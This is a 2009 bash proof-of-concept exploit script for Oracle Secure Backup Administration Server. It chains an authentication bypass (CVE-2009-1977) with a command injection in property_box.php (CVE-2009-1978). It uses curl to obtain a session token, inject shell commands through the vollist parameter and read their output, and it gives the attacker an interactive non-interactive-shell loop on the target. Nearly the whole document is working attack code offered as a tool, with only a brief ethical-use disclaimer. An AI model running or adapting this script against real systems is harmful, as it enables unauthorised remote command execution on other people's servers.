#!/bin/bash

#Oracle Secure Backup Administration Server authentication bypass, plus command injection vulnerability
#1-day exploit for CVE-2009-1977 and CVE-2009-1978 

#PoC script successfully tested on:
#Oracle Secure Backup Server 10.3.0.1.0_win32_release
#MS Windows Professional XP SP3

#In August 2009, ZDI discloses a few details regarding a couple of interesting vulnerabilities within Oracle Backup Admin server.
#Since I was quite interested in such flaws, I did a bit of research. This PoC exploits two separate vulnerabilities: a smart 
#authentication bypass and a trivial command injection, resulting in arbitrary command execution. 

#References:
#http://www.zerodayinitiative.com/advisories/ZDI-09-058/
#http://www.zerodayinitiative.com/advisories/ZDI-09-059/

#Use it for ethical pentesting only! The author accepts no liability for damage caused by this tool.
#Luca "ikki" Carettoni (blog.nibblesec.org), 10th September 2009

clear
echo ":: Oracle Secure Backup Admin Server 10.3 AuthBypass/CodeExec Exploit ::"

if [[ $# -ne 1 ]]
then
	echo "usage: ./$(basename $0) <target IP>"
	echo "i.e.: ./$(basename $0) 192.168.0.100"
	exit
fi

if ! which curl >/dev/null
then
	echo "'curl' is required in order to handle HTTPS connections"
    exit
fi

TARGET=$1

#Exploiting CVE-2009-1977 and getting a valid token
echo "[+] Exploiting CVE-2009-1977 against $TARGET"
postdata="button=Login&attempt=1&mode=&tab=&uname=--fakeoption&passwd=fakepwd"
session=`curl -kis "https://$TARGET/login.php" -d $postdata | grep "PHPSESSID=" | head -n 1 | cut -d= -f 2 | cut -d\; -f 1`

if [[ -z $session ]]
then
	echo "[!] Fatal error. No valid token has been retrieved"
	exit
fi

echo "[+] I got a valid token: $session"

#Use a valid session and CVE-2009-1978 in order to inject arbitrary commands
echo "[+] Exploiting CVE-2009-1978 against $TARGET"
shell="1%26ver>osb103shelltmp"
curl -k -s "https://$TARGET/property_box.php?type=CheckProperties&vollist=$shell" -b "PHPSESSID=$session" > /dev/null
check=`curl -ks "https://$TARGET/osb103shelltmp" -b "PHPSESSID=$session" | grep -i Microsoft`

if [[ -z $check ]]
then
	echo "[!] Fatal error. I cannot execute arbitrary commands"
	exit
fi

echo "[+] Enjoy your non-interactive shell! Use EXIT to clean up everything"
echo
echo \>$check

while(true); do
	echo -n \>
	read -r cmd
	
	if [ "$cmd" == "EXIT" ]
	then
		echo "[+] Removing the temporary file and closing"
		shell="1%26del%20osb103shelltmp"
		curl -k -s "https://$TARGET/property_box.php?type=CheckProperties&vollist=$shell" -b "PHPSESSID=$session" > /dev/null
		exit
	fi
	
	#URLencode function
	cmd=`echo -n "$cmd"|od -t x1 -A n|tr " " %`
	shell="1%26$cmd>osb103shelltmp"
	curl -k -s "https://$TARGET/property_box.php?type=CheckProperties&vollist=$shell" -b "PHPSESSID=$session" > /dev/null
	echo "[+] Last successful command execution:"
	curl -ks "https://$TARGET/osb103shelltmp" -b "PHPSESSID=$session"
done
#end